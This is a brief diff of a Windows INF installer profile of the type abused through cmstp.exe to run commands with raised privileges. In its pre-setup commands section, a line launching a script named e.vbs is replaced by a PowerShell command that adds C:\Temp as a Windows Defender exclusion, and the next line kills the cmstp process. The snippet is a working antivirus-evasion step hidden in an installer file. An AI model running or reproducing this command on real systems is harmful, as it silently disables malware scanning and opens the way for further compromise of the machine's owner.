@@ -8,7 +8,7 @@ RunPreSetupCommands=RunPreSetupCommandsSection
  
 [RunPreSetupCommandsSection]
 ; Commands Here will be run Before Setup Begins to install
-start e.vbs
+powershell -c Add-MpPreference -ExclusionPath "C:\Temp"
 taskkill /IM cmstp.exe /F
  
 [CustInstDestSectionAllUsers]
